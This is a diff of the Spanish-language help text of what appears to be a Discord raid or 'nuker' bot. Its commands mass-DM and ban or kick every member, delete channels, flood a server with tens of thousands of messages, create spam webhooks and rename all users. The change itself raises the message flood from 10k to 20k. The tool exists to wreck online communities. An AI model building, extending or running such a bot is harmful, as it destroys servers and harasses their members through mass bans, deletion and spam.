@@ -401,7 +401,7 @@ async def ayuda(ctx):
         "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
-        "!rD           -> elimina todo, crear 51 canales e inundar con 10k mensajes.\n"
+        "!rD           -> elimina todo, crear 51 canales e inundar con 20k mensajes.\n"
         "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
         "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
         "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
